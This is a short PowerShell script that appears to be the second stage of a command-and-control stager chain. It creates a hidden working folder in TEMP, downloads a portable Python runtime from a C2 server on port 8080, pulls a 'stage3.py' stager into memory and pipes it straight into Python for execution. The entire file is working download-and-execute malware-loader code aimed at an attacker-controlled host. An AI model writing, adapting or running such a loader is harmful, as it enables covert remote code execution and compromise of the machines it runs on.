# Python portable env
Write-Output \"[S1] Executing S2\"

echo "$RHOST"

# Config
$RHOST=\"c2\"
$RPORT=\"8080\"
$Server = \"http://${RHOST}:${RPORT}\"
$Root = \"${env:TEMP}/c2\"
$Python3 = \"${Root}/python3/python.exe\"

# Setup folder
New-Item -Type Directory -Path \"${Root}\" -Force | Out-Null
Set-Location \"${Root}\"

# Grab Python
if (-not (Test-Path \"${Python3}\")) {
    wget \"${Server}/resources/python3.zip\" -OutFile "python3.zip" -ErrorAction Ignore
    Expand-Archive -Path \"python3.zip\" -DestinationPath \"python3\"
}

# Load stager 3 into memory
$Stager3 = \"$((curl \"${Server}/scripts/remote/stagers/stage3.py\").ToString())\"

# Launch stager 3
Write-Output \"[S2] Executing S3\"
echo \"${Stager3}\" | & \"${Python3}\"